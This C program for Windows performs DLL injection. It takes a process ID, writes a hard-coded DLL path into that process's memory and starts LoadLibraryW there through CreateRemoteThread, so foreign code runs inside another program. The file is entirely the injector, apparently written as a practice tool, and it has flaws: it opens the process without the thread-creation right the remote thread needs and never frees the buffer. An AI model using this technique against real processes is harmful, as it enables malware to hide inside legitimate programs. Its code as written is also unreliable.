#include <Windows.h>
#include <stdio.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)

	int main(int argc, char* argv[]) {

		DWORD       TID = NULL;
		DWORD       PID = NULL;
		LPVOID      rBuffer = NULL;
		HANDLE      hProcess = NULL;
		HANDLE      hThread = NULL;
		HMODULE     hKernel32 = NULL;
		wchar_t     dllPath[MAX_PATH] = L"C:\\Users\\admin\\source\\repos\\newdll\\x64\\Debug\\newdll.dll";
		SIZE_T      pathSize = sizeof(dllPath);
		SIZE_T      bytesWritten = 0;

		if (argc < 2) {
			warn("usage: %s <PID>", argv[0]);
			return EXIT_FAILURE;
		}

		PID = atoi(argv[1]);
		hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, PID);

		if (hProcess == NULL) {
			warn("unable to get a handle to the process (%ld), error: 0x%lx", PID, GetLastError());
			return EXIT_FAILURE;
		}

		okay("got a handle to the process: %ld", PID);
		info("hProcess == 0x%p]\n", hProcess);

		hKernel32 = GetModuleHandleW(L"kernel32");

		if (hKernel32 == NULL) {
			warn("failed to get a handle to Kernel32.dll, error: 0x%lx", GetLastError());
			return EXIT_FAILURE;
		}

		okay("got a handle to Kernel32.dll");
		info("hKernel32== 0x%p]\n", hKernel32);
		/*поменять с поиска адреса на лоад либрари*/
		
		LPTHREAD_START_ROUTINE myLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
		info("address LoadLibraryW== 0x%p]\n", myLoadLibrary);

		rBuffer = VirtualAllocEx(hProcess, NULL, pathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
		printf("Buffer == %p\n", rBuffer);
		if (rBuffer == NULL) {
			warn("couldn't allocate a buffer to the target process memory, error: 0x%lx", GetLastError());
			goto CLEANUP;
		}

		okay("allocated buffer in target process memory (PAGE_READWRITE)");

		WriteProcessMemory(hProcess, rBuffer, dllPath, pathSize, &bytesWritten);
		okay("wrote %zu-bytes to the process memory", bytesWritten);

		hThread = CreateRemoteThread(hProcess, NULL, 0, myLoadLibrary, rBuffer, 0, &TID);

		if (hThread == NULL) {
			warn("unable to create thread, error: 0x%lx", GetLastError());
			goto CLEANUP;
		}

		okay("created a new thread in the target process! (%ld)", TID);
		info("hThread == 0x%p]\n", hThread);

		info("waiting for thread to finish");
		WaitForSingleObject(hThread, INFINITE);
		okay("thread finished execution");
		goto CLEANUP;

	CLEANUP:

		if (hThread) {
			info("closing handle to thread");
			CloseHandle(hThread);
		}

		if (hProcess) {
			info("closing handle to process");
			CloseHandle(hProcess);
		}

		okay("finished cleaning");
		return EXIT_SUCCESS;

	}